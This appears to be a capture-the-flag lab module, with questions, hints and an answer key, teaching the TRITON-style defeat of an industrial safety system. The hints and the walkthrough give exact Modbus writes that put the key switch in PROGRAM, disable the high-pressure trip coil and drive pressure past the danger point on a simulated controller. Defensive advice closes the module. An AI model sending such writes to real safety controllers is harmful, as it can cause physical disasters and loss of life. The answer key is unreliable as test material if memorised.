---
title: Defeat the safety system
questions:
  - ref: keyswitch-reg
    prompt: >-
      Which holding register holds the key switch position, and what value means
      PROGRAM (the writable, unsafe mode)? Give the register address. (decimal)
    kind: numeric
    value: 1
    points: 10
    hints:
      - body: "type sis_notes.txt - it maps the key switch and the trip coil."
        cost: 3
    explain: >-
      Holding[1] is the key switch: 1 = PROGRAM, 0 = RUN. It was left at 1. If it
      were 0, the trip logic (coil 5) could not be changed over the network, and
      this attack would fail with a write-protection error.
  - ref: run-protect
    prompt: >-
      Turn the key switch to RUN (holding[1]=0) and try to disable the trip coil.
      What happens? (one word that describes the outcome of the write)
    kind: regex
    pattern: "reject|rejected|denied|blocked|protected|fail"
    case_sensitive: false
    points: 15
    hints:
      - body: "modbus write sis-tricon.plant holding 1 0   then   modbus write sis-tricon.plant coil 5 0"
        cost: 5
    explain: >-
      In RUN the write is rejected: the safety logic is write protected. This is
      the control that TRITON needed disabled, and it was, because the key was
      left in PROGRAM. Set holding[1] back to 1 to continue the attack.
  - ref: defeat-sis
    prompt: >-
      With the key in PROGRAM, disable the high-pressure trip and drive the
      process past the danger line. When pressure exceeds the unsafe point with no
      trip, the controller latches the objective flag into holding[40..55].
      Submit it.
    kind: dynamic
    flag_prefix: OTF
    points: 35
    hints:
      - body: >-
          Ensure holding[1]=1 (PROGRAM). Disable the trip: modbus write
          sis-tricon.plant coil 5 0. Then raise the pressure setpoint above the
          trip point: modbus write sis-tricon.plant holding 10 130.
        cost: 10
      - body: >-
          Watch input[3] climb with 'status'. Past the unsafe point with the trip
          disabled, read holding[40..55]. (With the trip still enabled, the SIS
          would trip safe and no flag would appear - that is the whole point.)
        cost: 14
    explain: >-
      You disabled the last line of defence and pushed the process past the point
      where it should have been forced safe, and nothing stopped it. Had you left
      the trip enabled, the SIS would have tripped the plant to safety and no flag
      would exist. The single control that would have blocked you is a key switch
      turned to RUN. Your flag is unique to your session.
---

The key was left in PROGRAM. Feel what that costs.

## Confirm the protection is real

First prove to yourself that the key switch matters:

```
type sis_notes.txt
modbus write sis-tricon.plant holding 1 0     (turn the key to RUN)
modbus write sis-tricon.plant coil 5 0        (try to disable the trip)
```

The write is rejected: in RUN, the safety logic cannot be changed over the
network. That one physical setting is the whole defence.

## Now defeat it

The key was left in PROGRAM, so put it back and walk through the door:

```
modbus write sis-tricon.plant holding 1 1     (PROGRAM, as it was left)
modbus write sis-tricon.plant coil 5 0        (disable the high-pressure trip)
modbus write sis-tricon.plant holding 10 130  (drive the pressure up)
status                                        (watch input[3] climb past the trip point)
```

With the trip disabled, the pressure sails past the point where the SIS should
have forced the process safe, and nothing happens. When it crosses the unsafe
line the controller latches your flag into holding[40..55].

Then internalise the defence, because this is the room where prevention is almost
free: **turn the key to RUN, keep the SIS network and engineering access separate
from everything else, and alert on any logic change to a safety controller.**
